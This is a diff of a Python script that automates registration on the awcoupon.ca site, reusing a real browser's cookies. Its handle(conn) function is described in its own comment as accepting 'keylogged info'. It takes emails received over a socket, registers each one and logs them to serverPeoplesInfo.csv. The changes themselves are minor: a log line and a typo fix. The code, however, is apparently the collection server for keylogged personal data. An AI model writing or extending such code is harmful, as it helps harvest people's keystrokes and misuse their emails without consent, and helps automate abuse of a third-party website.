@@ -78,6 +78,8 @@ def soup(email='unknown',  firstName='friendly',  lastName='user',  postalCode =
     if email == 'unknown':
         logger.error("Required arguement email not provided")
         return -1
+        
+  
     page  = requests.get("https://awcoupon.ca/en/register")
     logger.info("======STARTING REGISTRATION======")
     if page.status_code != 200:
@@ -94,6 +96,7 @@ def soup(email='unknown',  firstName='friendly',  lastName='user',  postalCode =
     
     #The operational target
     targetURL = "https://awcoupon.ca/en/register"
+    logger.info("Trying to register this user: " + str(email))
     
     #Find the cookies of a real browser
     cookieJar = page.cookies
@@ -385,7 +388,7 @@ def handle(conn): #accpet keylogged info and save it to files
         for email in email:
             soup(email)
             with open(cwd+'/serverPeoplesInfo.csv', 'a',  newline='') as writer:
-                write.write(email)
+                writer.write(email)
     try:
         conn.close()
     except:
